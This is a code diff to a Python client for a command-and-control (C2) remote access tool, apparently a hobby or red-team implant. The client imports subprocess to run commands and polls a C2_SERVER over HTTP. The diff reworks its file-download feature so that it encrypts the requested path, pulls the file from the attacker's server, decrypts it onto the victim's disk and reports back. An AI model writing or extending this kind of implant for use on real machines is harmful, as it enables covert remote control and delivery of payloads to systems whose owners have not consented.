@@ -5,21 +5,16 @@ Author: Davood Yahay(D.Yakuza)
 # Import os methods based on OS, use platform.system() to detect OS
 from platform import system
 
-# Import for Windows Builds only
 if system() == "Windows":
     from os import getenv, chdir, path, getcwd
-# Import for Linux Builds only
 elif system() == "Linux":
     from os import getenv, uname, chdir, path, getcwd
 
 # Import for both Linux & Windows Builds
 from requests import get, exceptions, post
-# Custom Features Import
 from colorama import Fore
 from time import time, sleep
 from subprocess import run, PIPE, STDOUT
-from shutil import copyfileobj
-
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
@@ -135,10 +130,10 @@ while True:
             filepath = command.split()[2]
 
             # Split out the filename from the end of file path, or if only a file name was supplied, use it.
-            filename = filepath.rsplit("/",1)[-1]
+            filename = filepath.rsplit("/", 1)[-1]
 
             # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
-            encryptedFilepath = cipher.encrypt(filename.encode()).decode()
+            encryptedFilepath = cipher.encrypt(filepath.encode()).decode()
 
             # Use and HTTP GET request to stream the requested file from c2 server
             with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
@@ -148,8 +143,10 @@ while True:
                 if response.status_code == 200:
                     # Open the file and write the contents of the response to it
                     with open(filename, "wb") as fileHandle:
-                        """Use #noinspection PyTypeChecker to ignore warning"""
-                        copyfileobj(response.raw, fileHandle)
+                        # Decrypt the Response content and write the file out to the Disk, then Notify us on Server
+                        fileHandle.write(cipher.decrypt(response.content))
+
+                    # Notify us on the server that the file was downloaded
                     post_to_server(f"{filename} is now on {client}.\n")
 
         # If the path of the file doesn't enter correctly, notify us on the server
